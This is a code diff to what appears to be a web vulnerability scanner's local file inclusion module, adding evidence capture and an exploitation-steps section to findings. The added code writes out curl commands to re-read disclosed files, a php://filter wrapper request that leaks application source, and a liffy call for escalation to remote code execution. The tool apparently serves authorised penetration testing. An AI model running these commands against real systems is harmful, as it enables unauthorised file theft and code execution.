@@ -17,7 +17,7 @@ import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from scanner.engine import Finding, Severity, ScanEngine
-from scanner.vulns._common import Injector, is_safe_mode, iter_injectors
+from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors
 
 MODULE = "lfi_detect"
 
@@ -60,7 +60,23 @@ def _confirm(text: str, kind: str) -> str | None:
     return None
 
 
-def _finding(inj: Injector, payload: str, signal: str) -> Finding:
+def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
+    """Weaponise a confirmed LFI: read more files, leak source, escalate to RCE. Authorised targets only."""
+    if inj.proof is None:
+        return [{"step": 1, "description": "Re-issue the confirmed traversal payload in this form field.",
+                 "command": f"<inject into {inj.label}>: {payload}"}]
+    return [
+        {"step": 1, "description": "Re-read the disclosed system file to confirm arbitrary file read.",
+         "command": f'curl -sk "{inj.proof(payload)}"'},
+        {"step": 2, "description": "Leak application source via the PHP base64 filter wrapper.",
+         "command": f'curl -sk "{inj.proof("php://filter/convert.base64-encode/resource=index.php")}" | base64 -d'},
+        {"step": 3, "description": "Escalate to RCE through log poisoning / wrapper chains.",
+         "command": f'liffy "{inj.proof(payload)}"'},
+    ]
+
+
+def _finding(inj: Injector, payload: str, signal: str,
+             proof_lines: list[str] | None = None) -> Finding:
     proof_url = inj.proof(payload) if inj.proof else None
     return Finding(
         module=MODULE,
@@ -72,7 +88,9 @@ def _finding(inj: Injector, payload: str, signal: str) -> Finding:
         recommendation=("Never build file paths from user input. Use a fixed allowlist of identifiers, "
                         "resolve and canonicalise paths, and reject traversal sequences and wrappers."),
         raw={"location": inj.label, "parameter": inj.param, "payload": payload,
-             "signal": signal, "proof_url": proof_url, "confidence": "high"},
+             "signal": signal, "proof_url": proof_url, "confidence": "high",
+             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
+             "exploitation": _exploitation_steps(inj, payload)},
     )
 
 
@@ -80,7 +98,9 @@ def _test(inj: Injector) -> Finding | None:
     for payload, kind in _PAYLOADS:
         resp = inj.inject(payload)
         if resp is not None and (signal := _confirm(resp.text, kind)):
-            return _finding(inj, payload, signal)
+            return _finding(inj, payload, signal,
+                            evidence(inj, payload, resp,
+                                     indicator=f"file content disclosed: {signal}"))
     return None
 
 
